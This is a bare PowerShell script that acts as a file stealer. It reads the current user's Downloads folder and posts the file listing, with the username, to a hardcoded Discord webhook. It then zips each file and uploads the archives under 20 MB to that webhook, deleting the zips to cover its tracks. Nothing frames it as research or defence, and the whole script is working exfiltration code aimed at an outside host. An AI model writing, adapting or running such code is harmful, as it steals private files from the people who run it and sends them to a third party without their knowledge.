$hookurl = "https://discord.com/api/webhooks/1098548616068612198/rT74HA1xheFrCnJfVPiuFveHXeA9rMkPzTEd0iQ8pyIoxSZglyWWJkIwEVQv_xmI2xUO";
$maxFileSizeMB = 20;
$downloadFolder = (New-Object -ComObject Shell.Application).NameSpace("shell:Downloads").Self.Path;

function Remove-Diacritics {
    param ([string]$src = [String]::Empty);

    $normalized = $src.Normalize([Text.NormalizationForm]::FormD);
    $sb = New-Object Text.StringBuilder;

    $normalized.ToCharArray() | ForEach-Object {
        if ([Globalization.CharUnicodeInfo]::GetUnicodeCategory($_) -ne [Globalization.UnicodeCategory]::NonSpacingMark) {
            [void]$sb.Append($_)
        }
    }

    $sb.ToString();
};

function Upload-Discord {
    [CmdletBinding()]
    param(
        [parameter(Position=0)][string]$file,
        [parameter(Position=1)][string]$text
    )

    $Body = @{"username" = $env:username; "content" = $text};

    if (-not ([string]::IsNullOrEmpty($text))) {
        $null=Invoke-RestMethod -ContentType "Application/Json" -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -s -F "file1=@$file" $hookurl >null
    }
};

Upload-Discord -text "$((Get-ChildItem $downloadFolder) | ForEach-Object {
    if ($_.PSIsContainer) {
        "$($_.Name) (folder)`r"
    } else {
        $fileSize = $_.Length / 1MB;
        $formattedSize = "{0:N2}" -f $fileSize;

        if ($fileSize -lt 10) {
            "**$($_.Name) ($formattedSize MB)**`r"
        } else {
            "$($_.Name) ($formattedSize MB)`r"
        }
    }
})";

Get-ChildItem -Path $downloadFolder -Recurse | ForEach-Object {
    if (-not $_.PSIsContainer) {
        $zipFilePath = Join-Path -Path $downloadFolder -ChildPath "$($_.Name).zip";
        Compress-Archive -Path $_.FullName -DestinationPath $zipFilePath -CompressionLevel Optimal;
        "$zipFileSizeMB = (Get-Item $zipFilePath).Length / 1MB";

        if ($zipFileSizeMB -lt $maxFileSizeMB) {
            Upload-Discord -file $zipFilePath;
            Remove-Item $zipFilePath;
            Start-Sleep -Milliseconds 300;
        } else {
            Remove-Item $zipFilePath;
        }
    }
}
